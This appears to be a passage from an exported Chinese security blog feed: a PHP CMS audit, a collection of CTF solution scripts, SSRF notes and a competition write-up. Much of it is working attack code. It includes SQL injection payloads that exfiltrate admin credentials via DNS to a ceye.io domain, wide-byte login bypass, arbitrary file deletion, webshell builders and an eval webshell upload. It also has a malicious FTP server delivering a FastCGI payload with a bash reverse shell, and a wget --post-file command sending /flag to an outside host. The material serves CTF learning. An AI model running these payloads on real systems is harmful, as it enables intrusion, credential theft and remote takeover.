getenv('HTTP_FORWARDED'); &#125; else &#123; $ip = $_SERVER['REMOTE_ADDR']; &#125; return $ip;&#125; 可以看到，插入语句里的ip字段的值是以上述方式获取，而通过上文审计可以得知，$_SERVER这个变量并没有被转义，也就是我们可以通过伪造X-Forwarded-For这个header 头来控制 ip字段的值，从而进行insert注入。 这是代码中执行的sql语句 12INSERT INTO ".table('comment')." (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '".getip()."', '$is_check') 如果我们控制了ip字段的值，并且让字段值为&#39;or sleep(3) or&#39; 12INSERT INTO ".table('comment')." (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) VALUES ('', '$id', '$user_id', '$type', '$mood', '$content', '$timestamp', '"'or sleep(3) or'"', '$is_check') 测试 好像并没有反应，纳闷至极，回头看看代码。 需要三个个条件才能执行到这条sql $act == &#39;send&#39; 和 empty($id)，这两个变量的值可以通过$_REQUEST变量传递，empty($content)POST获得。 可以明显感觉到延迟了一会，所以这里经过测试，可以检测出存在sql时间盲注。时间盲注可谓是sql注入最麻烦的注入了，肯定是需要写脚本来利用，但是其实还有另一种方式，通过dnslog，但是仅限于服务器在windows下。 1'or load_file(concat('\\\\',(select database()),'.uutiyi.ceye.io\\abc')) or' 通过平台 http://ceye.io/records/dns 数据库名直接拼接在了域名上，可谓是方便至极。 1'or load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.uutiyi.ceye.io\\abc')) or' 这里查询表名的时候需要用limit 0,1一个一个查，但也比脚本跑要好得多了。接下来都是重复的步骤，节约时间，直接跳到最后一步。 1'or load_file(concat('\\\\',(select group_concat(admin_name,pwd) from blue_admin limit 0,1),'.uutiyi.ceye.io\\abc')) or' 成功拿到管理员的用户名密码。 前面已经审计出两个sql注入漏洞，并且在这套代码里，sql注入漏洞太多，审计过程中就忽略了类型重复的漏洞。 继续审计。 /uploads/guest_book.php 在79行中的sql语句中，可以看到插入的值中拼接了很多变量，经过分析，这里有两个变量可控，一个是$online_ip和$content。 跟踪$online_ip变量。 跳转到uploads/include/common.inc.php文件中 获取了getip()函数的返回值，从上文分析中，可以知道，这里的getip获得的返回值可以通过伪造X-Forwarded-For这个header 头来控制 ip字段的值。 测试 成功延迟了3秒，说明可以注入，这里就不在继续演示了，上面两次已经演示过了。 任意文件删除在user.php 795行 可以看到执行了一个unlink函数，参数直接拼接了$_POST[&#39;face_pic3&#39;]，可以直接进行任意文件删除， 先在网页根目录创建一个文件进行测试 回溯看看，执行这到这需要什么条件。 需要进行登录，点击用户管理-&gt;我的个人资料-&gt;确定修改，用bp抓取这个请求 将face_pic3参数修改为./1.txt 提交后即可删除刚刚创建的文件。 后台登录宽字节注入绕过登录uploads/admin/include/common.fun.php 在179行 12345678910111213function check_admin($name, $pwd)&#123; global $db; $row = $db-&gt;getone("SELECT COUNT(*) AS num FROM ".table('admin')." WHERE admin_name='$name' and pwd = md5('$pwd')"); if($row['num'] &gt; 0) &#123; return true; &#125; else &#123; return false; &#125;&#125; 这个是验证后台登录的函数，这里的sql语句可以看到直接拼接了$name变量。看看哪里调用了这个函数。 回溯到 /uploads/admin/login.php 32行调用了check_admin函数，传入了$admin_name和$admin_pwd变量，这两个变量通过POST接收，也并没有经过处理。那么我们直接通过后台登录页面进行传参。 1http://127.0.0.1:9916/uploads/admin/login.php 提交 1admin_name=admin&apos; or 1=1%23&amp;admin_pwd=admin&amp;submit=%B5%C7%C2%BC&amp;act=do_login 单引号经过了转义 这里可以用宽字节注入，输入&#39; 被转义成\&#39;，用 ``%df绕过 ，%df%5c’，这里的%5c就是`，%df%5c会被解析成一个中文字符，从而照成&#39;逃逸。 成功登录 总结这套代码其实远远不止上面列出的这几个漏洞，代码中的sql语句基本上都是直接进行拼接，大部分地方都可以被利用。由此可见当年的那些网站有多不安全。这也是我第一次对整站进行审计，说说自己的感受吧，这套网站中，sql注入很多，刚开始还很耐心，后边真的懒得去看了，这套代码中有一个文件包含的洞，但是在我的环境中就是利用不了，我还以为是win10特性变了，不能在末尾追加.来绕过后缀的拼接，就在win7上复现，结果还是不行，最终也没找到原因，真是头秃，很多时候都感觉无从下手，有很多的文件，就是不知道去看哪一个，上面就是我遇到的问题。不过也学到了不少，这次审计学到的就是dnslog的利用，之前是知道，但是没有实际去做，用dnslog确实让时间盲注省事不少，但只能仅限于windows下。]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>php代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-解题脚本集合]]></title>
    <url>%2F2021%2F11%2F09%2FCTF-%E8%A7%A3%E9%A2%98%E8%84%9A%E6%9C%AC%E9%9B%86%E5%90%88%2F</url>
    <content type="text"><![CDATA[将伪随机数转换成php_mt_seed可以识别的数据格式12345678910111213import requestsimport randomdict1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'dict2='KVQP0LdJKRaV3n9D'dict3 = dict1[::-1] length = len(dict2) res=''for i in range(len(dict2)): for j in range(len(dict1)): if dict2[i] == dict1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(dict1)-1)+' ' breakprint(res) SQL盲注脚本1234567891011121314151617181920212223242526272829303132import requestsurl='http://bdeb176a-4425-4fe9-997e-02afb5312134.node3.buuoj.cn/index.php'flag=''for i in range(50): a = 32 b = 128 mid = (a+b)//2 while(a&lt;b): #stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))&gt;0) 爆表名 #stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='flag')),1,1))&gt;0) 爆列名 print(mid) payload = url+"?stunum=0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))&gt;%d)"%(i,mid) import time time.sleep(1) re = requests.get(url=payload) # 首先判断目标值 是否小于 if 'admin' in re.text: a = mid + 1 else: # 目标值 大于 则直接 将 mid 赋值给 b b = mid mid = (a+b)//2 # 这个二分查找的方式是 完整的走完一遍，也就是跑7次 if (mid==32|mid==128): break flag +=chr(mid) print(flag) 盲注二次注入1234567891011121314151617181920212223242526272829import requests,reflag_hex = ''# email=a9%40qq.com&amp;username='%2bsubstr((hex(hex((select * from flag))))from 1 for 10)%2b'&amp;password=1url_reg = "http://024137a8-4186-4739-8cd8-41f6374a9248.node4.buuoj.cn:81/register.php"url_login = "http://024137a8-4186-4739-8cd8-41f6374a9248.node4.buuoj.cn:81/login.php"for i in range(100): reg_data = &#123; 'email': 'b%d@qq.com'%(i), 'username': "'+substr((hex(hex((select * from flag))))from %d for 10)+'"%(i*10+1), 'password': '1' &#125; requests.post(url=url_reg, data=reg_data) data_login = &#123; 'email': 'b%d@qq.com'%(i), 'password': '1' &#125; res = requests.post(url=url_login, data=data_login) res = re.findall(r'&lt;span class="user-name"&gt;(.*?)&lt;/span&gt;', res.text,re.S)[0].strip() print(res) if res == '0': break flag_hex +=res print(flag_hex) 无字母数字webshell-异或绕过构建脚本123456789101112131415import urllib.parsefind = ['a','q','u','_','i','s','c','t','e']for i in range(1,256): for j in range(1,256): result = chr(i^j) if(result in find): a = i.to_bytes(1,byteorder='big') b = j.to_bytes(1,byteorder='big') a = urllib.parse.quote(a) b = urllib.parse.quote(b) print("%s:%s^%s"%(result,a,b)) # $&#123;%FF%FF%FF^%B8%BA%AB&#125;&#123;%FF^%A0&#125;(); # aqua_is_cute # %FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF^%9E%8E%8A%9E%A0%96%8C%A0%9C%8A%8B%9A 123456789101112131415161718192021&lt;?php$l = "";$r = "";$argv = str_split("_POST");for ($i = 0; $i &lt; count($argv); $i++) &#123; for ($j = 0; $j &lt; 255; $j++) &#123; $k = chr($j) ^ chr(255); // dechex(255) = ff if ($k == $argv[$i]) &#123; if ($j &lt; 16) &#123; $l .= "%ff"; $r .= "%0" . dechex($j); continue; &#125; $l .= "%ff"; $r .= "%" . dechex($j); continue; &#125; &#125;&#125;echo "\&#123;$l`$r\&#125;"; 无字母数字webshell构造1234567891011121314151617181920212223&lt;?phpheader('Content-Type: text/html; charset=utf-8');$str = '当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”';for($i=0; $i&lt;mb_strlen($str, 'utf-8'); $i++)&#123; $st = mb_substr($str, $i,1, 'utf-8'); $a = ~($st); $b = $a[1]; #取汉字的第一位 if($b==$_GET['a']) #$_GET['a']想要得到的字符 &#123; echo $st;exit; &#125;&#125;// 用法//$_=~('北')[1]//#s//同理构造。system。为什么不构造eval呢。大家可以去尝试一下//$a='system';//$b='eval';//这两者动态调用的区别//system是个函数。可以动态调用。而eval是PHP语法的一部分。并不是函数。不能动态调用?&gt; 无列名注入123456789101112131415161718import requestsurl='http://7a93d6a2-cc99-43d5-aaa6-aab30f35ff99.node4.buuoj.cn:81/'payload='-1||((select 1,"&#123;&#125;")&gt;(select * from f1ag_1s_h3r3_hhhhh))'flag=''for j in range(1,50): for i in range(32,128): hexchar=flag+chr(i) py=payload.format(hexchar) print(py) datas=&#123;'id':py&#125; import time time.sleep(1) re=requests.post(url=url,data=datas) if 'Nu1L' in re.text: flag+=chr(i-1) print(flag) break 正则回溯123456789import requestsfrom io import BytesIOdata = &#123; 'treasure': BytesIO(b'flag.php' + b' a' * 1000000)&#125;res = requests.post('http://119.61.19.217:57305/treasure.php', data=data)print(res.text) python文件上传12345678import requestsfrom io import BytesIOurl = "http://8c8e609f-51ac-48b8-82ea-0f19cc24e3ea.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"payload = "&lt;?php eval($_POST['cmd']);?&gt;"file_data = &#123;"file": BytesIO(payload.encode())&#125;res = requests.post(url=url,files=file_data, allow_redirects=False)print(res) RC加密1234567891011121314151617181920212223242526272829303132333435import base64from urllib import parsedef rc4_main(key = "init_key", message = "init_message"):#返回加密后得内容 s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_boxdef rc4_excrypt(plain, box): res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = "".join(res) return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))key = "HereIsTreasure" #此处为密文message = input("请输入明文:\n")enc_base64 = rc4_main( key , message )enc_init = str(base64.b64decode(enc_base64),'utf-8')enc_url = parse.quote(enc_init)print("rc4加密后的url编码:"+enc_url)#print("rc4加密后的base64编码"+enc_base64) SSRF-恶意的 ftp 服务器（一）123456789101112131415161718192021222324252627import sockets = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('0.0.0.0', 23))s.listen(1)conn, addr = s.accept()conn.send(b'220 welcome\n')#Service ready for new user.#Client send anonymous username#USER anonymousconn.send(b'331 Please specify the password.\n')#User name okay, need password.#Client send anonymous password.#PASS anonymousconn.send(b'230 Login successful.\n')#User logged in, proceed. Logged out if appropriate.#TYPE Iconn.send(b'200 Switching to Binary mode.\n')#Size /conn.send(b'550 Could not get the file size.\n')#EPSV (1)conn.send(b'150 ok\n')#PASVconn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n') #STOR / (2)conn.send(b'150 Permission denied.\n')#QUITconn.send(b'221 Goodbye.\n')conn.close() SSRF-恶意的 ftp 服务器（二）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475# -*- coding: utf-8 -*-# @Time : 2021/1/13 6:56 下午# @Author : tntaxin# @File : ftp_redirect.py# @Software:import socketfrom urllib.parse import unquote# 对gopherus生成的payload进行一次urldecodepayload = unquote("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.43.247/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00")payload = payload.encode('utf-8')host = '0.0.0.0'port = 23sk = socket.socket()sk.bind((host, port))sk.listen(5)# ftp被动模式的passvie port,监听到1234sk2 = socket.socket()sk2.bind((host, 1234))sk2.listen()# 计数器，用于区分是第几次ftp连接count = 1while 1: conn, address = sk.accept() conn.send(b"200 \n") print(conn.recv(20)) # USER aaa\r\n 客户端传来用户名 if count == 1: conn.send(b"220 ready\n") else: conn.send(b"200 ready\n") print(conn.recv(20)) # TYPE I\r\n 客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本 if count == 1: conn.send(b"215 \n") else: conn.send(b"200 \n") print(conn.recv(20)) # SIZE /123\r\n 客户端询问文件/123的大小 if count == 1: conn.send(b"213 3 \n") else: conn.send(b"300 \n") print(conn.recv(20)) # EPSV\r\n' conn.send(b"200 \n") print(conn.recv(20)) # PASV\r\n 客户端告诉服务端进入被动连接模式 if count == 1: conn.send(b"227 127,0,0,1,4,210\n") # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234 else: conn.send(b"227 127,0,0,1,35,40\n") # 端口计算规则：35*256+40=9000 print(conn.recv(20)) # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n if count == 1: conn.send(b"125 \n") # 告诉客户端可以开始数据连接了 # 新建一个socket给服务端返回我们的payload print("建立连接!") conn2, address2 = sk2.accept() conn2.send(payload) conn2.close() print("断开连接!") else: conn.send(b"150 \n") print(conn.recv(20)) exit() # 第一次连接是下载文件，需要告诉客户端下载已经结束 if count == 1: conn.send(b"226 \n") conn.close() count += 1]]></content>
      <categories>
        <category>CTF</category>
        <category>CTF做题姿势总结</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-Web【SSRF】漏洞做题姿势积累]]></title>
    <url>%2F2021%2F11%2F08%2FCTF-Web%E3%80%90SSRF%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF%2F</url>
    <content type="text"><![CDATA[前言 本篇文章专门用于记录做SSRF类题目的做题姿势，会不断更新。 相关文章浅入深出 Fastcgi 协议分析与 PHP-FPM 攻击方法 https://whoamianony.top/2021/05/15/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA%20Fastcgi%20%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E4%B8%8E%20PHP-FPM%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/ 与ssrf相关php相关函数parse_url 解析 URL，返回其组成部分 1234567&lt;?php$url = 'http://username:password@hostname/path?arg=value#anchor';print_r(parse_url($url));echo parse_url($url, PHP_URL_PATH);?&gt; 输出 1234567891011Array( [scheme] =&gt; http [host] =&gt; hostname [user] =&gt; username [pass] =&gt; password [path] =&gt; /path [query] =&gt; arg=value [fragment] =&gt; anchor)/path gethostbyname() 返回主机名对应的 IPv4地址。 curl_exec 执行 cURL 会话 1234567891011121314&lt;?php// 创建新的 cURL 资源$ch = curl_init();// 设置 URL 和相应的选项curl_setopt($ch, CURLOPT_URL, "http://www.example.com/");curl_setopt($ch, CURLOPT_HEADER, 0);// 抓取 URL 并把它传递给浏览器curl_exec($ch);// 关闭 cURL 资源，并且释放系统资源curl_close($ch);?&gt;]]></content>
      <categories>
        <category>CTF</category>
        <category>CTF做题姿势总结</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[11月陇原战疫2021网络安全大赛赛后部分web复现]]></title>
    <url>%2F2021%2F11%2F08%2F11%E6%9C%88%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB2021%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E8%B5%9B%E5%90%8E%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[前言打自闭了，一道做不起。 CheckIN考点go代码审计 解题过程主要代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217package mainimport ( "fmt" "io" "time" "bytes" "regexp" "os/exec" "plugin" "gopkg.in/mgo.v2" "gopkg.in/mgo.v2/bson" "github.com/gin-contrib/sessions" "github.com/gin-gonic/gin" "github.com/gin-contrib/sessions/cookie" "github.com/gin-contrib/multitemplate" "net/http")type Url struct &#123; Url string `json:"url" binding:"required"`&#125;type User struct &#123; Username string Password string&#125;const MOGODB_URI = "127.0.0.1:27017"// 中间间：验证登录func MiddleWare() gin.HandlerFunc &#123; return func(c *gin.Context) &#123; session := sessions.Default(c) if session.Get("username") == nil || session.Get("password") != os.Getenv("ADMIN_PASS") &#123; c.Header("Content-Type", "text/html; charset=utf-8") c.String(200, "&lt;script&gt;alert('You are not admin!');window.location.href='/login'&lt;/script&gt;") return &#125; c.Next() &#125;&#125;// 登录func loginController(c *gin.Context) &#123; session := sessions.Default(c) if session.Get("username") != nil &#123; c.Redirect(http.StatusFound, "/home") return &#125; // 拿到前台传入的 用户名和密码 username := c.PostForm("username") password := c.PostForm("password") // 判断用户名或密码是否为空 if username == "" || password == "" &#123; c.Header("Content-Type", "text/html; charset=utf-8") c.String(200, "&lt;script&gt;alert('The username or password is empty');window.location.href='/login'&lt;/script&gt;") return &#125; // 连接数据库 conn, err := mgo.Dial(MOGODB_URI) if err != nil &#123; panic(err) &#125; defer conn.Close() conn.SetMode(mgo.Monotonic, true) db_table := conn.DB("ctf").C("users") result := User&#123;&#125; err = db_table.Find(bson.M&#123;"$where":"function() &#123;if(this.username == '"+username+"' &amp;&amp; this.password == '"+password+"') &#123;return true;&#125;&#125;"&#125;).One(&amp;result) if result.Username == "" &#123; c.Header("Content-Type", "text/html; charset=utf-8") c.String(200, "&lt;script&gt;alert('Login Failed!');window.location.href='/login'&lt;/script&gt;") return &#125; if username == result.Username || password == result.Password &#123; session.Set("username", username) session.Set("password", password) session.Save() c.Redirect(http.StatusFound, "/home") return &#125; else &#123; c.Header("Content-Type", "text/html; charset=utf-8") c.String(200, "&lt;script&gt;alert('Pretend you logged in successfully');window.location.href='/login'&lt;/script&gt;") return &#125;&#125;func proxyController(c *gin.Context) &#123; var url Url if err := c.ShouldBindJSON(&amp;url); err != nil &#123; c.JSON(500, gin.H&#123;"msg": err&#125;) return &#125; // 匹配 re := regexp.MustCompile("127.0.0.1|0.0.0.0|06433|0x|0177|localhost|ffff") if re.MatchString(url.Url) &#123; c.JSON(403, gin.H&#123;"msg": "Url Forbidden"&#125;) return &#125; client := &amp;http.Client&#123;Timeout: 2 * time.Second&#125; // 可以进行http请求 resp, err := client.Get(url.Url) if err != nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;"error": err.Error()&#125;) return &#125; defer resp.Body.Close() var buffer [512]byte result := bytes.NewBuffer(nil) for &#123; n, err := resp.Body.Read(buffer[0:]) result.Write(buffer[0:n]) if err != nil &amp;&amp; err == io.EOF &#123; break &#125; else if err != nil &#123; c.JSON(http.StatusInternalServerError, gin.H&#123;"error": err.Error()&#125;) return &#125; &#125; c.JSON(http.StatusOK, gin.H&#123;"data": result.String()&#125;)&#125;func getController(c *gin.Context) &#123; // 只执行命令 不返回结果 cmd := exec.Command("/bin/wget", c.QueryArray("argv")[1:]...) err := cmd.Run() if err != nil &#123; fmt.Println("error: ", err) &#125; c.String(http.StatusOK, "Nothing")&#125;func createMyRender() multitemplate.Renderer &#123; r := multitemplate.NewRenderer() r.AddFromFiles("login", "templates/layouts/base.tmpl", "templates/layouts/login.tmpl") r.AddFromFiles("home", "templates/layouts/home.tmpl", "templates/layouts/home.tmpl") return r&#125;func main() &#123; router := gin.Default() router.Static("/static", "./static") p, err := plugin.Open("sess_init.so") if err != nil &#123; panic(err) &#125; f, err := p.Lookup("Sessinit") if err != nil &#123; panic(err) &#125; key := f.(func() string)() storage := cookie.NewStore([]byte(key)) router.Use(sessions.Sessions("mysession", storage)) router.HTMLRender = createMyRender() router.MaxMultipartMemory = 8 &lt;&lt; 20 router.GET("/", func(c *gin.Context) &#123; session := sessions.Default(c) if session.Get("username") != nil &#123; c.Redirect(http.StatusFound, "/home") return &#125; else &#123; c.Redirect(http.StatusFound, "/login") return &#125; &#125;) router.GET("/login", func(c *gin.Context) &#123; session := sessions.Default(c) if session.Get("username") != nil &#123; c.Redirect(http.StatusFound, "/home") return &#125; c.HTML(200, "login", gin.H&#123; "title": "CheckIn", &#125;) &#125;) router.GET("/home", MiddleWare(), func(c *gin.Context) &#123; c.HTML(200, "home", gin.H&#123; "title": "CheckIn", &#125;) &#125;) router.POST("/proxy", MiddleWare(), proxyController) router.GET("/wget", getController) router.POST("/login", loginController) _ = router.Run("0.0.0.0:8080") // listen and serve on 0.0.0.0:8080&#125; 第一次遇到这种题，代码都看不懂，分析半天，看了wp后，发现只需要利用/wget。 payload 1/wget?argv=1&amp;argv=--post-file&amp;argv=/flag&amp;argv=http://xx.xx.xx.xx:4444 eaaasyphp考点php反序列化 FTP-SSRF 攻击 FPM/FastCGI 解题过程打开1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071 &lt;?phpclass Check &#123; public static $str1 = false; public static $str2 = false;&#125;class Esle &#123; public function __wakeup() &#123; Check::$str1 = true; &#125;&#125;class Hint &#123; public function __wakeup()&#123; $this-&gt;hint = "no hint"; &#125; public function __destruct()&#123; if(!$this-&gt;hint)&#123; $this-&gt;hint = "phpinfo"; ($this-&gt;hint)(); &#125; &#125;&#125;class Bunny &#123; public function __toString() &#123; if (Check::$str2) &#123; if(!$this-&gt;data)&#123; $this-&gt;data = $_REQUEST['data']; &#125; file_put_contents($this-&gt;filename, $this-&gt;data); &#125; else &#123; throw new Error("Error"); &#125; &#125;&#125;class Welcome &#123; public function __invoke() &#123; Check::$str2 = true; return "Welcome" . $this-&gt;username; &#125;&#125;class Bypass &#123; public function __destruct() &#123; if (Check::$str1) &#123; ($this-&gt;str4)(); &#125; else &#123; throw new Error("Error"); &#125; &#125;&#125;if (isset($_GET['code'])) &#123; unserialize($_GET['code']);&#125; else &#123; highlight_file(__FILE__);&#125; 分析分析确定了利用点Bunny::file_put_contents($this-&gt;filename, $this-&gt;data);，这里链子的构造也很简单，Bypass::__destruct-&gt;Welcome::__invoke-&gt;Bunny::__toString-&gt;file_put_contents($this-&gt;filename, 